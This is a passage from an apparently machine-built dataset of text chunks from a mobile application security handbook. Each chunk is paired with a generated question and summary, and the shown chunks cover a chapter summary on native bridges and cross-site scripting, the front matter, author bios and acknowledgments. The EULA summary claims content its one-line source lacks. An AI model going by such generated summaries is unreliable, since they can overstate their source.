persistent storage. There are various\nsolutions to this problem, including native plugins that use SQLCipher or platform-specific workarounds using\nthe Android keystore or iOS keychain. When assessing a Cordova-based application you should pay specific\nattention to any content that is persistently stored and investigate what, if any, encryption mechanisms are in\nplace.\nSummary\nThis chapter introduced the concept of cross-platform mobile applications and the various security concerns\nassociated with this type of application.\nA key consideration for cross-platform applications is whether or not a native bridge exists and, if so, whether it\nis exposed in any way. This chapter detailed the various methods of implementing native bridges across the\ndifferent platforms. It also introduced the two most common methods of exploiting bridges: cross-application\nscripting and cross-site scripting.\nExploitation of cross-application or cross-site scripting vulnerabilities in cross-platform applications can be\nquite serious, particularly if a native bridge exists. Cross-platform frameworks, such as Cordova, use whitelisting\nto attempt to reduce the exposure of the bridge but in many cases this is not all encompassing and as you have\nlearned in this chapter, can be bypassed in certain circumstances.\nAs the trend for developing cross-platform applications grows, it is likely that they will come under greater\nscrutiny from the security community in the future and other avenues of attack will be discovered.\nThe Mobile Application Hacker’s Handbook\nPublished by\nJohn Wiley & Sons, Inc.\n10475 Crosspoint Boulevard\nIndianapolis, IN 46256\nwww.wiley.com\nCopyright © 2015 by John Wiley & Sons, Inc., Indianapolis, Indiana\nPublished simultaneously in Canada\nISBN: 978-1-118-95850-6\nISBN: 978-1-118-95852-0 (ebk)\nISBN: 978-1-118-95851-3 (ebk)\nNo part of this publication may be reproduced, stored in a retrieval system or transmitted in any form or by any means, electronic, mechanical,\nphotocopying, recording, scanning or otherwise, except as permitted under Sections 107 or 108 of the 1976 United States Copyright Act, without either\nthe prior written permission of the Publisher, or authorization through payment of the appropriate per-copy fee to the Copyright Clearance Center, 222\nRosewood Drive, Danvers, MA 01923, (978) 750-8400, fax (978) 646-8600. Requests to the Publisher for permission should be addressed to the\nPermissions Department, John Wiley & Sons, Inc., 111 River Street, Hoboken, NJ 07030, (201) 748-6011, fax (201) 748-6008, or online at\nhttp://www.wiley.com/go/permissions.\nLimit of Liability/Disclaimer of Warranty: The publisher and the author make no representations or warranties with respect to the accuracy or\ncompleteness of the contents of this work and specifically disclaim all warranties, including without limitation warranties of fitness for a particular\npurpose. No warranty may be created or extended by sales or promotional materials. The advice and strategies contained herein may not be suitable for\nevery situation. This work is sold with the understanding that the publisher is not engaged in rendering legal, accounting, or other professional services.\nIf professional assistance is required, the services of a competent professional person should be sought. Neither the publisher nor the author shall be\nliable for damages arising herefrom. The fact that an organization or Web site is referred to in this work as a citation and/or a potential source of\nfurther information does not mean that the author or the publisher endorses the information the organization or website may provide or\nrecommendations it may make. Further, readers should be aware that Internet websites listed in this work may have changed or disappeared between\nwhen this work was written and when it is read.\nFor general information on our other products and services please contact our Customer Care Department within the United States at (877) 762-2974,\noutside the United States at (317) 572-3993 or fax (317) 572-4002.\nWiley publishes in a variety of print and electronic formats and by print-on-demand. Some material included with standard print versions of this book\nmay not be included in e-books or in print-on-demand. If this book refers to media such as a CD or DVD that is not included in the version you\npurchased, you may download this material at http://booksupport.wiley.com. For more information about Wiley products, visit www.wiley.com.\nLibrary of Congress Control Number: 2014954689\nTrademarks: Wiley and the Wiley logo are trademarks or registered trademarks of John Wiley & Sons, Inc. and/or its affiliates, in the United States\nand other countries, and may not be used without written permission. All other trademarks are the property of their respective owners. John Wiley &\nSons, Inc. is not associated with any product or vendor mentioned in this book.",
    "question": "What are the key security considerations and potential vulnerabilities associated with cross-platform mobile applications, and how do different platforms implement and expose native functionality through their respective bridges?",
    "summary": "This chapter discusses cross-platform mobile applications, which use web technologies to operate on multiple platforms. It highlights the benefits like reduced development costs and easier updates, but also addresses security concerns such as vulnerabilities in native bridges and potential for cross-site scripting attacks. The chapter explains how different platforms implement these bridges and uses PhoneGap as an example to illustrate common security issues."
  },
  {
    "start": 108,
    "end": 110,
    "text": "I would like to dedicate this book to my wife Adele and thank her for her continued support not only whilst\nworking on this book but throughout my career.\n—Dominic\nI would like to dedicate this book to Wendy, the love of my life. I cannot wait to spend my time with someone\nwho understands me so well. You support me tirelessly in spite of me pursuing many time-consuming projects.\nYou are owed many movie nights and a catch-up on time where I was absent while writing.\n—Tyrone\nI would like to dedicate this book to my parents, Jill and Andy, as well as my brother Dave, for all the support\nand encouragement they have given me over the years. My friends are also owed immensely for their support\nand friendship over the years.\n—Shaun\nI would like to dedicate this book to Ilma who for over a decade has kept the home fire burning whilst I—ve\npursed my passion around the globe.\n—Ollie\nAbout the Authors\nDominic Chell is a cofounder of MDSec, where in addition to leading the mobile practice, he is responsible for\ndelivering consultancy and training engagements for a variety of clients. Dominic’s career has spanned over a\ndecade and has been almost entirely focused on the technical aspects of application security. He has spoken at\nnumerous conferences as well as releasing several publications on mobile security. Dominic is also listed as a\nsubject matter expert for a secure iOS development exam.\nTyrone Erasmus has a degree in computer engineering and is currently the head of mobile security at MWR\nInfoSecurity South Africa. He enjoys delving into many different areas of penetration testing and security\nresearch, with a large portion of his research efforts in the past spent on Android. His interests lie\npredominantly in offensive security and the advancement of tools and new techniques in this sphere. He has\nspoken at various security conferences, and was part of the team that won the Android category at Mobile\nPwn2Own in 2012. His work is acknowledged internationally in the Android hacking space, and he is known\namong peers as a well-rounded security professional.\nShaun Colley is a principal security consultant for IOActive where he focuses on mobile device security, native\ncode review, and reverse engineering. During his career, he has been primarily focused on mobile security and\nreverse engineering. Shaun has also spoken several times at industry meets and conferences. He holds a BSc\n(Hons) in Chemistry from the University of Leeds, England.\nOllie Whitehouse is technical director for NCC Group, where he is responsible for Cyber Defence Operations,\nManaged Services, and its Exploit Development Group along technical innovation across the Technical Security\nConsulting practice. Ollie's career has spanned nearly two decades and included research, consultancy, and\nmanagement positions at BlackBerry, Symantec, and @stake where he specialized in software, mobile,\nembedded, wireless, and telecommunications security.\nAbout the Technical Editor\nRob Shimonski (www.shimonski.com) is a best-selling author and editor with over 15 years’ experience\ndeveloping, producing, and distributing print media in the form of books, magazines, and periodicals. To date,\nRob has successfully created over 100 books that are currently in circulation. Rob has worked for countless\ncompanies to include CompTIA, Microsoft, Wiley, Cisco, the National Security Agency, and Digidesign.\nRob has over 20 years’ experience working in IT, networking, systems, and security. He is a veteran of the US\nmilitary and has been entrenched in security topics and assignments his entire professional career. In the\nmilitary, Rob was assigned to a communications (radio) battalion supporting training efforts and exercises.\nHaving worked with mobile phones since their inception, Rob is an expert in mobile phone development and\nsecurity.",
    "question": "Who are the authors of the book and what are their professional backgrounds and contributions to the field of application security and mobile technology?",
    "summary": "The authors dedicate their book to their loved ones, including spouses, family, and friends, for their support throughout their careers. Dominic, Tyrone, Shaun, and Ollie are all professionals in the field of application and mobile security, with extensive experience and contributions to the industry. Rob Shimonski, the technical editor, is a seasoned author and expert in IT and security, with over 20 years of experience and a background in the US military."
  },
  {
    "start": 111,
    "end": 112,
    "text": "Credits\nExecutive Editor\nCarol Long\nProject Editor\nSydney Argenta\nTechnical Editor\nRob Shimonski\nProduction Editor\nRebecca Anderson\nCopy Editor\nPaula Lowell\nManager of Content Development and Assembly\nMary Beth Wakefield\nMarketing Director\nDavid Mayhew\nMarketing Manager\nCarrie Sherrill\nProfessional Technology and Strategy Director\nBarry Pruett\nBusiness Manager\nAmy Knies\nAssociate Publisher\nJim Minatel\nProject Coordinator, Cover\nPatrick Redmond\nProofreader\nSarah Kaikini, Word One New York\nIndexer\nJohnna VanHoose Dinse\nCover Designer\nWiley\nCover Image\nClockwork gears © iStock.com/Ryhor Bruyeu; App icon © iStock.com/ -cuba-\nAcknowledgments\nFirstly, Dominic would like to thank the other authors for their hard work in developing this book; without their\ncontributions it would have been too big a mountain to climb! Dominic would also like to acknowledge the\nsupport of his colleagues from MDSec, in particular Marcus Pinto, Dan Brown, Ryan Chell, and Matthew Hickey\nwho worked tirelessly to pick up the slack whilst he was writing this book. He would also like to highlight the\ngreat work that the wider security community has done in this field and which provided a foundation for him to\nexpand his knowledge—where applicable, this work has been properly referenced in this book. Dominic is also\nindebted to the numerous individuals that he has had the pleasure of working with through the years and from\nwho he learnt so much, including Dafydd Stuttard, John Heasman, Peter Winter-Smith, Adam Matthews,\nSherief Hammad, and the rest of the team at the old NGS Software. Finally, Dominic would like to thank his\nparents for everything that they have done and continue to do; their support has been invaluable over the years.\nTyrone would like to acknowledge Daniel and the rest of the team at MWR for tinkering alongside him on\nAndroid and sharing their knowledge, as well as Riaan and Harry for supporting him through his career. He\nwould also like to acknowledge his family and friends who keep an active interest in his life and reminded him\nthat there is life beyond his computer screen. Finally, Tyrone would like to thank Dominic for contacting him\nout of the blue to be a part of the author team!\nShaun would like to thank all the authors of this book in helping to make it a reality; who knows where the idea\nfor this book would be without them. Shaun would also like to thank his colleagues at IOActive for their support\nwhile writing this book. He would like to acknowledge all those with whom he has shared in interesting\nconversations about computer security and other completely unrelated real-life topics, including Dominic Chell,\nMarcus Pinto, Matthew Hickey, John Heasman, Ilja van Sprundel, Peter Winter-Smith, Ben Harrison-Smith,\nVincent Berg, and Shane Macaulay, among others. Finally, Shaun would like to thank his parents, Jill and Andy,\nhis brother Dave, and the rest of his family for their continued support during his career; as well as his friends,\njust for being awesome mates.\nOllie would like to say thanks to all the security researchers who have published their security research relating\nto BlackBerry technologies, including Zach Lanier, Ben Nell, Ralf-Philipp Weinmann, Shivang Desa, Tim Brown,\nAlex Plaskett, Daniel Martin Gomez, and Andy Davis. Without the hard work and perseverance of these\nindividuals, public understanding would not be where it is today. He would also like to thank the numerous\nindividuals he’s been lucky enough to work closely with over the years and from whom he learned so much,\nincluding Foob, Nathan Catlow, Bambam, Rob Wood, Aaron Adams, Pete Beck, Paul Collett, Paul Ashton,\nJeremy Boone, Jon Lindsay, Graham Murphy, and Ian Robertson. Ollie’s final thanks is to Twitter, for providing\ncontinual distractions, and Kismet (the cat) for keeping him company on weekends whilst he wrote his chapters.\nFinally, as a team, we are grateful to the people at Wiley—in particular, to Carol Long, Sydney Argenta, and the\nrest of our editorial team. Their help in developing and polishing our manuscript was invaluable, and apologies\nagain for testing our deadlines. In particular, a big apology from Shaun who loves nothing more than leaving\neverything till the last minute!",
    "question": "Who are the individuals thanked in the acknowledgments section of the book and what is the significance of their contributions?",
    "summary": "The text acknowledges the contributions of various authors and team members who helped create the book. It also includes personal thanks from the authors to their colleagues, friends, family, and publishers for their support. Each author expresses gratitude for the collaboration and the individuals who contributed to their work in the field of security."
  },
  {
    "start": 113,
    "end": 113,
    "text": "WILEY END USER LICENSE AGREEMENT\nGo to www.wiley.com/go/eula to access Wiley’s ebook EULA.",
    "question": "Where can readers find Wiley's ebook end user license agreement?",
    "summary": "The Wiley End User License Agreement (EULA) outlines the terms and conditions for using Wiley's ebooks. It can be accessed at www.wiley.com/go/eula. The agreement specifies the rights and responsibilities of users regarding the use, access, and distribution of the ebooks."
  }
]